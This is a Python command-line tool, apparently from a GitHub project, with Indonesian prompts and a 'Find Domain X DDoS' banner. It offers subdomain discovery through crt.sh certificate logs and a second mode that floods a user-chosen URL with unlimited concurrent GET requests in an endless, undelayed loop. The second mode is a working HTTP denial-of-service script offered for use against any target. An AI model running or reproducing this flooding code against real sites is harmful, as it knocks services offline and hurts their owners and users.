import aiohttp
import asyncio
import os
import sys
from urllib.parse import urljoin

# Fungsi untuk menampilkan banner
def display_banner():
    print("""
#####    #######  ##   ##   #####   ##   ##  #######  ######   
 ## ##    ##   #  ##   ##  ### ###  ##   ##   ##   #   ##  ##  
 ##  ##   ##      ##   ##  ##   ##  ##   ##   ##       ##  ##  
 ##  ##   ####     ## ##   ##   ##   ## ##    ####     #####   
 ##  ##   ##       ## ##   ##   ##   ## ##    ##       ## ##   
 ## ##    ##   #    ###    ### ###    ###     ##   #   ## ##   
#####    #######    ###     #####     ###    #######  #### ##   V1.0

 \033[1;32m+ -- -- +=[ Author: kdandy | Repo: https://github.com/kdandy/devtools\033[1;m
 \033[1;32m+ -- -- +=[ Find Domain X DDoS \033[1;mdev >
    """)

def display_menu():
    print("\nPilih fitur yang ingin dijalankan:")
    print("1. Cari subdomain menggunakan crt.sh")
    print("2. Spam permintaan GET ke URL target")
    choice = input("Masukkan pilihan (1/2): ")
    return choice

async def fetch_subdomains(domain):
    crt_sh_url = f"https://crt.sh/?q=%25.{domain}&output=json"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(crt_sh_url) as response:
                if response.status == 200:
                    data = await response.json()
                    subdomains = {entry['name_value'] for entry in data}  # Menggunakan set untuk menghapus duplikat
                    print("\nSubdomain yang ditemukan:")
                    for subdomain in subdomains:
                        print(subdomain)
                else:
                    print(f"Gagal mengakses crt.sh. Status code: {response.status}")
        except Exception as e:
            print(f"Terjadi error: {e}")

async def send_todo_get(session, url):
    try:
        async with session.get(url) as response:
            if response.status == 200:
                print(f"sukses akses link: {url}")
            else:
                print(f"Failed to access link. Status code: {response.status}")
    except aiohttp.ClientError:
        print("Request failed due to network error.")
    except Exception as e:
        print(f"Unexpected error: {e}")

async def spam_todos_get(url, requests_per_batch):
    async with aiohttp.ClientSession() as session:
        while True:
            tasks = [send_todo_get(session, url) for _ in range(requests_per_batch)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0)  # Adjust delay as needed

async def main():
    display_banner()
    choice = display_menu()

    if choice == "1":
        domain = input("Masukkan target domain (misalnya example.com): ")
        await fetch_subdomains(domain)
    elif choice == "2":
        url = input("Masukkan URL target: ")
        requests_per_batch = int(input("Masukkan jumlah permintaan per requests: "))
        await spam_todos_get(url, requests_per_batch)
    else:
        print("Pilihan tidak valid.")

try:
    asyncio.run(main())
except KeyboardInterrupt:
    print("Program dihentikan oleh pengguna.")